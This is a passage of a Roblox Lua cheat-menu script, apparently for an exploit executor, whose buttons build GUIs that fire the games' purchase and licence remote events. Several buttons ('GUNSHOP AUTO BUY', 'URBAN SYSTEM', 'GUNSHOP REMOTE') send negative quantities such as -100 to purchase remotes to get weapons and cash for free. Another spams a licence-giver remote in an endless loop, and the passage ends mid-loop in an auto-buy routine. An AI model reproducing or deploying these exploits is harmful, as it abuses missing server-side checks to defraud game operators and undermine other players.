        writeclipboard(text)
    else
        warn("Clipboard copy not supported in this environment.")
    end
end

local function addToolLine(tool)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -8, 0, 26)
    btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextXAlignment = Enum.TextXAlignment.Left
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 14
    btn.Text = " " .. tool.Name
    btn.AutoButtonColor = false
    btn.Parent = scrolling

    local corner = Instance.new("UICorner", btn)
    corner.CornerRadius = UDim.new(0, 6)

    -- Hover effect
    btn.MouseEnter:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    end)
    btn.MouseLeave:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    end)

    -- Click to copy
    btn.MouseButton1Click:Connect(function()
        copyToClipboard(tool.Name)
        btn.TextColor3 = Color3.fromRGB(0, 255, 0)
        btn.Text = " Copied: " .. tool.Name
        task.wait(0.8)
        btn.Text = " " .. tool.Name
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    end)
end

local function rebuildList()
    clearList()
    local tools = {}
    for _, inst in ipairs(storageSystem:GetDescendants()) do
        if inst:IsA("Tool") then
            table.insert(tools, inst)
        end
    end
    table.sort(tools, function(a,b) return a.Name:lower() < b.Name:lower() end)
    for _, t in ipairs(tools) do
        addToolLine(t)
    end
    scrolling.CanvasSize = UDim2.new(0, 0, 0, #tools * 32)
end

--// Build + Live Update
rebuildList()
storageSystem.DescendantAdded:Connect(function(obj)
    if obj:IsA("Tool") then rebuildList() end
end)
storageSystem.DescendantRemoving:Connect(function(obj)
    if obj:IsA("Tool") then rebuildList() end
end)

--// Toggle GUI visibility with "K"
local visible = true
UserInputService.InputBegan:Connect(function(input, gpe)
	if gpe then return end
	if input.KeyCode == Enum.KeyCode.K then
		visible = not visible
		gui.Enabled = visible
	end
end)

print("‚úÖ StorageSystem Tools Viewer loaded (Press O to toggle, click to copy).")
end)

--// 8 Buttons in Main Menu
addMainMenuButton("BAGONG BARYO OPEN THIS + BUY ITEM REMOTE", function()
	-- LocalScript: GunEngineAssets.WeaponModels Viewer (NO DUPLICATES)
-- Place in StarterPlayer > StarterPlayerScripts

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Wait for path
local gunEngine = ReplicatedStorage:WaitForChild("GunEngineAssets", 5)
local weaponModels = gunEngine and gunEngine:WaitForChild("WeaponModels", 5)
if not weaponModels then
	warn("GunEngineAssets.WeaponModels not found!")
	return
end

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = "WeaponModelsViewer"
gui.ResetOnSpawn = false
gui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 450, 0, 420)
frame.Position = UDim2.new(0.5, -225, 0.25, 0)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

-- Title
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 35)
titleBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
titleBar.BorderSizePixel = 0
titleBar.Parent = frame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 12)
titleCorner.Parent = titleBar

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 1, 0)
title.BackgroundTransparency = 1
title.Text = "WeaponModels Viewer"
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Parent = titleBar

-- Info
local info = Instance.new("TextLabel")
info.Size = UDim2.new(1, -20, 0, 20)
info.Position = UDim2.new(0, 10, 0, 40)
info.BackgroundTransparency = 1
info.Text = "Click to copy name | Press O to toggle"
info.Font = Enum.Font.Gotham
info.TextSize = 13
info.TextColor3 = Color3.fromRGB(180, 180, 180)
info.TextXAlignment = Enum.TextXAlignment.Left
info.Parent = frame

-- Scrolling
local scrolling = Instance.new("ScrollingFrame")
scrolling.Size = UDim2.new(1, -20, 1, -75)
scrolling.Position = UDim2.new(0, 10, 0, 65)
scrolling.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
scrolling.BorderSizePixel = 0
scrolling.ScrollBarThickness = 6
scrolling.CanvasSize = UDim2.new(0, 0, 0, 0)
scrolling.Parent = frame

local layout = Instance.new("UIListLayout")
layout.Padding = UDim.new(0, 8)
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Parent = scrolling

-- Copy
local function copy(text)
	if setclipboard then setclipboard(text)
	elseif writeclipboard then writeclipboard(text) end
end

-- Clear
local function clear()
	for _, v in scrolling:GetChildren() do
		if v:IsA("GuiObject") then v:Destroy() end
	end
end

-- Icon
local function getIcon(obj)
	if obj:IsA("Tool") then return "Tool"
	elseif obj:IsA("Model") then return "Model"
	elseif obj:IsA("Folder") then return "Folder"
	elseif obj:IsA("Part") then return "Part"
	else return "Item"
	end
end

-- Add Header
local function addHeader(name)
	local lbl = Instance.new("TextLabel")
	lbl.Size = UDim2.new(1, -10, 0, 30)
	lbl.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	lbl.Text = " " .. name
	lbl.Font = Enum.Font.GothamBold
	lbl.TextSize = 14
	lbl.TextColor3 = Color3.fromRGB(100, 200, 255)
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	lbl.Parent = scrolling

	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, 6)
	c.Parent = lbl
end

-- Add Item
local function addItem(item)
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, -20, 0, 28)
	btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	btn.TextColor3 = Color3.fromRGB(220, 220, 220)
	btn.TextXAlignment = Enum.TextXAlignment.Left
	btn.Font = Enum.Font.Gotham
	btn.TextSize = 13
	btn.Text = "   " .. getIcon(item) .. " " .. item.Name
	btn.AutoButtonColor = false
	btn.Parent = scrolling

	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, 5)
	c.Parent = btn

	-- Hover
	btn.MouseEnter:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(35, 35, 35) end)
	btn.MouseLeave:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20) end)

	-- Click to copy
	btn.MouseButton1Click:Connect(function()
		copy(item.Name)
		local oldText = btn.Text
		btn.TextColor3 = Color3.fromRGB(0, 255, 0)
		btn.Text = "   Copied: " .. item.Name
		task.wait(0.7)
		btn.Text = oldText
		btn.TextColor3 = Color3.fromRGB(220, 220, 220)
	end)
end

-- Rebuild (NO DUPLICATES)
local function rebuild()
	clear()

	local seen = {}  -- Prevent duplicates
	local folderMap = {}

	-- Only scan direct children of WeaponModels
	for _, child in ipairs(weaponModels:GetChildren()) do
		local name = child.Name
		if not seen[name] then
			seen[name] = true

			if child:IsA("Folder") then
				-- Folder ‚Üí collect its children
				folderMap[child.Name] = folderMap[child.Name] or {}
				for _, item in ipairs(child:GetChildren()) do
					table.insert(folderMap[child.Name], item)
				end
			else
				-- Direct item ‚Üí put in "Main"
				folderMap["Main"] = folderMap["Main"] or {}
				table.insert(folderMap["Main"], child)
			end
		end
	end

	-- Sort folders
	local folders = {}
	for folderName, _ in pairs(folderMap) do
		table.insert(folders, folderName)
	end
	table.sort(folders)

	-- Build UI
	local y = 0
	for _, folderName in ipairs(folders) do
		local items = folderMap[folderName]
		if #items > 0 then
			addHeader(folderName)
			y += 38

			table.sort(items, function(a,b) return a.Name:lower() < b.Name:lower() end)

			for _, item in ipairs(items) do
				addItem(item)
				y += 36
			end
		end
	end

	scrolling.CanvasSize = UDim2.new(0, 0, 0, y + 20)
end

-- Initial
task.spawn(rebuild)

-- Live Update (debounced)
local updating = false
local function update()
	if updating then return end
	updating = true
	task.wait(0.2)
	rebuild()
	updating = false
end

weaponModels.ChildAdded:Connect(update)
weaponModels.ChildRemoved:Connect(update)
weaponModels.DescendantAdded:Connect(update)
weaponModels.DescendantRemoving:Connect(update)

-- Toggle O
local visible = true
UserInputService.InputBegan:Connect(function(input, gp)
	if gp then return end
	if input.KeyCode == Enum.KeyCode.O then
		visible = not visible
		gui.Enabled = visible
	end
end)

print("BURAT MONSY")
end)

--// 8 Buttons in Main Menu
addMainMenuButton("BUYITEM REMOTE [3KTG]", function()
    -- LocalScript: All-black draggable BUY GUI (centered title + auto-clear textboxes)
-- Place this in StarterGui or StarterPlayerScripts

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

--// Find the remote to use
local buyRemote = ReplicatedStorage:FindFirstChild("BuyItemRemote") or ReplicatedStorage:FindFirstChild("AntiExploit")

--// GUI
local gui = Instance.new("ScreenGui")
gui.Name = "CashMenuGUI"
gui.ResetOnSpawn = false
gui.Parent = playerGui

--// Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 200)
frame.Position = UDim2.new(0.5, -150, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.Text = "TAONG GOMA"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.TextWrapped = true
title.TextXAlignment = Enum.TextXAlignment.Center
title.TextYAlignment = Enum.TextYAlignment.Center

--// Item Name TextBox
local itemBox = Instance.new("TextBox", frame)
itemBox.Size = UDim2.new(1, -20, 0, 35)
itemBox.Position = UDim2.new(0, 10, 0, 55)
itemBox.PlaceholderText = "Enter Item Name"
itemBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
itemBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
itemBox.TextColor3 = Color3.fromRGB(255, 255, 255)
itemBox.Font = Enum.Font.Gotham
itemBox.TextSize = 14
Instance.new("UICorner", itemBox).CornerRadius = UDim.new(0, 6)
itemBox.ClearTextOnFocus = true -- auto clear when clicked

--// Amount TextBox
local amountBox = Instance.new("TextBox", frame)
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 100)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
amountBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
amountBox.TextColor3 = Color3.fromRGB(255, 255, 255)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 14
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)
amountBox.ClearTextOnFocus = true -- auto clear when clicked

--// Send Button
local sendButton = Instance.new("TextButton", frame)
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 145)
sendButton.Text = "BUY"
sendButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
sendButton.Font = Enum.Font.GothamBold
sendButton.TextSize = 16
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Feedback Text
local feedback = Instance.new("TextLabel", frame)
feedback.Size = UDim2.new(1, -20, 0, 20)
feedback.Position = UDim2.new(0, 10, 1, -22)
feedback.BackgroundTransparency = 1
feedback.Font = Enum.Font.Gotham
feedback.TextSize = 12
feedback.TextColor3 = Color3.fromRGB(200, 200, 200)
feedback.Text = ""

local function showFeedback(msg, t)
	feedback.Text = msg
	task.delay(t or 2, function()
		if feedback then feedback.Text = "" end
	end)
end

--// Buy Logic
local function buyItem()
	local item = itemBox.Text
	local amount = tonumber(amountBox.Text)

	if item == "" or not amount then
		showFeedback("Invalid input!", 2)
		return
	end

	if not buyRemote then
		showFeedback("Remote not found!", 2)
		return
	end

	buyRemote:FireServer(item, amount)
	showFeedback("Sent: " .. item .. " x" .. amount, 2)
end

sendButton.MouseButton1Click:Connect(buyItem)
itemBox.FocusLost:Connect(function(enter) if enter then buyItem() end end)
amountBox.FocusLost:Connect(function(enter) if enter then buyItem() end end)

-- Hover effect (slight brightening)
sendButton.MouseEnter:Connect(function()
	sendButton.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
end)
sendButton.MouseLeave:Connect(function()
	sendButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GUNSHOP REMOTE [3KTG]", function()
    -- LocalScript: TAONG GOMA CASH MENU (GunShop Purchase System)
-- Place inside StarterGui or StarterPlayerScripts

--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

--// Remote setup
local purchaseEvent = ReplicatedStorage:WaitForChild("GunShop"):WaitForChild("Events"):WaitForChild("Purchase")

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "TaongGomaCashMenu"
gui.ResetOnSpawn = false
gui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 200)
frame.Position = UDim2.new(0.5, -150, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.Text = "TAONG GOMA"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.TextWrapped = true
title.TextXAlignment = Enum.TextXAlignment.Center
title.TextYAlignment = Enum.TextYAlignment.Center

--// Item Name TextBox
local itemBox = Instance.new("TextBox", frame)
itemBox.Size = UDim2.new(1, -20, 0, 35)
itemBox.Position = UDim2.new(0, 10, 0, 55)
itemBox.PlaceholderText = "Enter Item Name"
itemBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
itemBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
itemBox.TextColor3 = Color3.fromRGB(255, 255, 255)
itemBox.Font = Enum.Font.Gotham
itemBox.TextSize = 14
itemBox.ClearTextOnFocus = true
Instance.new("UICorner", itemBox).CornerRadius = UDim.new(0, 6)

--// Amount TextBox
local amountBox = Instance.new("TextBox", frame)
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 100)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
amountBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
amountBox.TextColor3 = Color3.fromRGB(255, 255, 255)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 14
amountBox.ClearTextOnFocus = true
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// BUY Button
local buyButton = Instance.new("TextButton", frame)
buyButton.Size = UDim2.new(1, -20, 0, 40)
buyButton.Position = UDim2.new(0, 10, 0, 145)
buyButton.Text = "BUY"
buyButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
buyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
buyButton.Font = Enum.Font.GothamBold
buyButton.TextSize = 16
Instance.new("UICorner", buyButton).CornerRadius = UDim.new(0, 6)

-- Hover animation
buyButton.MouseEnter:Connect(function()
	buyButton.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
end)
buyButton.MouseLeave:Connect(function()
	buyButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
end)

-- Feedback label
local feedback = Instance.new("TextLabel", frame)
feedback.Size = UDim2.new(1, -20, 0, 20)
feedback.Position = UDim2.new(0, 10, 1, -22)
feedback.BackgroundTransparency = 1
feedback.Font = Enum.Font.Gotham
feedback.TextSize = 12
feedback.TextColor3 = Color3.fromRGB(200, 200, 200)
feedback.Text = ""

-- Feedback function
local function showFeedback(msg, t)
	feedback.Text = msg
	task.delay(t or 2, function()
		if feedback then feedback.Text = "" end
	end)
end

-- Purchase Logic
local function buyItem()
	local item = itemBox.Text
	local amount = tonumber(-amountBox.Text)

	if item == "" or not amount then
		showFeedback("Invalid item or amount!", 2)
		return
	end

	purchaseEvent:FireServer(item, amount)
	showFeedback("Sent: " .. item .. " x" .. amount, 2)
end

buyButton.MouseButton1Click:Connect(buyItem)
itemBox.FocusLost:Connect(function(enter) if enter then buyItem() end end)
amountBox.FocusLost:Connect(function(enter) if enter then buyItem() end end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("GUNSHOP AUTO BUY [3KTG]", function()
	-- Services
local player = game.Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Setup UI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "GunCommandUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Name = "MainFrame"
frame.Size = UDim2.new(0, 300, 0, 150)
frame.Position = UDim2.new(0.5, -150, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local titleLabel = Instance.new("TextLabel")
titleLabel.Text = "GOMA GUN CMDS"
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- White instead of red
titleLabel.TextSize = 16
titleLabel.BackgroundTransparency = 1
titleLabel.Size = UDim2.new(1, 0, 0, 20)
titleLabel.Position = UDim2.new(0, 0, 0, 5)
titleLabel.Parent = frame

local textBox = Instance.new("TextBox")
textBox.Name = "CommandBox"
textBox.Text = ""
textBox.PlaceholderText = "Enter Command (3KTG)"
textBox.Font = Enum.Font.GothamBold
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.TextSize = 24
textBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
textBox.BorderSizePixel = 0
textBox.Size = UDim2.new(0.9, 0, 0, 40)
textBox.Position = UDim2.new(0.05, 0, 0, 40)
textBox.ClearTextOnFocus = false
textBox.Parent = frame

local toggleButton = Instance.new("TextButton")
toggleButton.Text = "OFF"
toggleButton.Font = Enum.Font.GothamBold
toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- White when OFF
toggleButton.TextSize = 22
toggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggleButton.BorderSizePixel = 0
toggleButton.Size = UDim2.new(0.6, 0, 0, 35)
toggleButton.Position = UDim2.new(0.2, 0, 0, 95)
toggleButton.Parent = frame

-- Commands Table
local commands = {}
local gunEvent = ReplicatedStorage:FindFirstChild("GunShop") and ReplicatedStorage.GunShop:FindFirstChild("Events") and ReplicatedStorage.GunShop.Events:FindFirstChild("Purchase")

commands["BuySilenced"] = function()
	if gunEvent then
		gunEvent:FireServer("Silenced Pistol", -100)
	end
end

commands["BuyGlock17"] = function()
	if gunEvent then
		gunEvent:FireServer("Glock-17", -100)
	end
end

commands["BuyGlock19"] = function()
	if gunEvent then
		gunEvent:FireServer("Glock-19", -100)
	end
end

commands["BuyDeagle"] = function()
	if gunEvent then
		gunEvent:FireServer("Desert Deagle", -100)
	end
end

commands["BuyAmmo"] = function()
	if gunEvent then
		gunEvent:FireServer("AmmoBox", -100)
	end
end

commands["BuyAllGuns"] = function()
	if gunEvent then
		gunEvent:FireServer("Silenced Pistol", -100)
		gunEvent:FireServer("Glock-17", -100)
		gunEvent:FireServer("Glock-19", -100)
		gunEvent:FireServer("Desert Deagle", -100)
		gunEvent:FireServer("AmmoBox", -100)
	end
end

-- Toggle Logic
local isOn = false

toggleButton.MouseButton1Click:Connect(function()
	isOn = not isOn

	if isOn then
		toggleButton.Text = "ON"
		toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
		local cmdText = textBox.Text
		local commandFunc = commands[cmdText]
		if commandFunc then
			commandFunc()
		else
			warn("Unknown command: " .. cmdText)
		end
	else
		toggleButton.Text = "OFF"
		toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- White when OFF
	end
end)

-- Drag Logic
local dragging = false
local dragInput, mousePos, framePos

frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		mousePos = input.Position
		framePos = frame.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

frame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		local delta = input.Position - mousePos
		frame.Position = UDim2.new(
			framePos.X.Scale, framePos.X.Offset + delta.X,
			framePos.Y.Scale, framePos.Y.Offset + delta.Y
		)
	end
end)
end)

addMainMenuButton("URBAN SYSTEM [3KTG]", function()
	-- Services
local player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")

-- UI Setup
local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = "PurchaseCMDGui"
screenGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 300, 0, 150)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local titleLabel = Instance.new("TextLabel")
titleLabel.Text = "GOMA URBAN GUN BUY"
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- Changed from red to white
titleLabel.TextSize = 16
titleLabel.BackgroundTransparency = 1
titleLabel.Size = UDim2.new(1, 0, 0, 20)
titleLabel.Position = UDim2.new(0, 0, 0, 5)
titleLabel.Parent = mainFrame

local textBox = Instance.new("TextBox")
textBox.PlaceholderText = "Enter Command (3KTG)"
textBox.Font = Enum.Font.GothamBold
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.TextSize = 20
textBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
textBox.BorderSizePixel = 0
textBox.Size = UDim2.new(0.9, 0, 0, 40)
textBox.Position = UDim2.new(0.05, 0, 0, 40)
textBox.ClearTextOnFocus = false
textBox.Text = ""
textBox.Parent = mainFrame

local toggleButton = Instance.new("TextButton")
toggleButton.Text = "OFF"
toggleButton.Font = Enum.Font.GothamBold
toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- Changed from red to white
toggleButton.TextSize = 22
toggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggleButton.BorderSizePixel = 0
toggleButton.Size = UDim2.new(0.6, 0, 0, 35)
toggleButton.Position = UDim2.new(0.2, 0, 0, 95)
toggleButton.Parent = mainFrame

-- Command Table
local purchaseEvent = ReplicatedStorage:WaitForChild("PurchaseEvent")
local commands = {}

commands["BuyAK"] = function()
	purchaseEvent:FireServer("AK-47", -100)
end

commands["BuyAR15"] = function()
	purchaseEvent:FireServer("AR15", -100)
end

commands["BuyVector"] = function()
	purchaseEvent:FireServer("Vector", -100)
end

commands["BuySyringe"] = function()
	purchaseEvent:FireServer("Syringe", -100)
end

commands["BuyP90"] = function()
	purchaseEvent:FireServer("P90", -100)
end

commands["BuyBandage"] = function()
	purchaseEvent:FireServer("Bandage", -100)
end

commands["BuyAmmo1"] = function()
	purchaseEvent:FireServer("AmmoBox_1", -100)
end

commands["BuySten"] = function()
	purchaseEvent:FireServer("Sten Gun", -100)
end

commands["BuyAll2"] = function()
	local items = {
		"AK-47", "AR15", "Vector", "Syringe",
		"P90", "Bandage", "AmmoBox_1", "Sten Gun"
	}
	for _, item in ipairs(items) do
		purchaseEvent:FireServer(item, -100)
	end
end

-- Toggle Logic
local isOn = false

toggleButton.MouseButton1Click:Connect(function()
	isOn = not isOn
	if isOn then
		toggleButton.Text = "ON"
		toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
		local inputCmd = textBox.Text
		local func = commands[inputCmd]
		if func then
			func()
		else
			warn("Unknown command: " .. inputCmd)
		end
	else
		toggleButton.Text = "OFF"
		toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- White when OFF
	end
end)

-- Optional: Drag support
local dragging, dragInput, startPos, startFramePos
mainFrame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		startPos = input.Position
		startFramePos = mainFrame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

mainFrame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if dragging and input == dragInput then
		local delta = input.Position - startPos
		mainFrame.Position = UDim2.new(
			startFramePos.X.Scale, startFramePos.X.Offset + delta.X,
			startFramePos.Y.Scale, startFramePos.Y.Offset + delta.Y
		)
	end
end)
end)

addMainMenuButton("LICENCE GIVER SYSTEM [3KTG]", function()
	while true do game:GetService("ReplicatedStorage").GunLicenseGiver:FireServer("User",0.1)
wait()
end
end)

addMainMenuButton("PROMINENCE CITY S1 [3KTG]", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Position = UDim2.new(0.5, -130, 0.5, -160)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "PROMINENCE CITY S1"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- List of items to buy
local items = {
    {".50", ".50"},
    {"AmmoBox", "AmmoBox"}
}

local selectedItem = nil

-- Dropdown Button
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Item"
dropdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdown.TextColor3 = Color3.new(1, 1, 1)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

-- Dropdown Frame
local itemHeight = 28
local dropdownHeight = #items * itemHeight
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, dropdownHeight)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

-- Dropdown Buttons
for i, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, itemHeight)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * itemHeight)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedItem = item[2]
        dropdown.Text = item[1]
        dropdownFrame.Visible = false
    end)
end

-- Toggle Dropdown
dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Auto Buy Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 100 + dropdownHeight)
toggle.Text = "Start Auto Buy"
toggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggle.TextColor3 = Color3.new(1, 1, 1)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto adjust frame height
local padding = 140 -- title + spacing + toggle
local frameHeight = padding + dropdownHeight
frame.Size = UDim2.new(0, 260, 0, frameHeight)

-- Auto Buy Logic
local isAutoBuying = false
toggle.MouseButton1Click:Connect(function()
    isAutoBuying = not isAutoBuying
    toggle.Text = isAutoBuying and "Stop Auto Buy" or "Start Auto Buy"
    
    while isAutoBuying do
        if selectedItem then
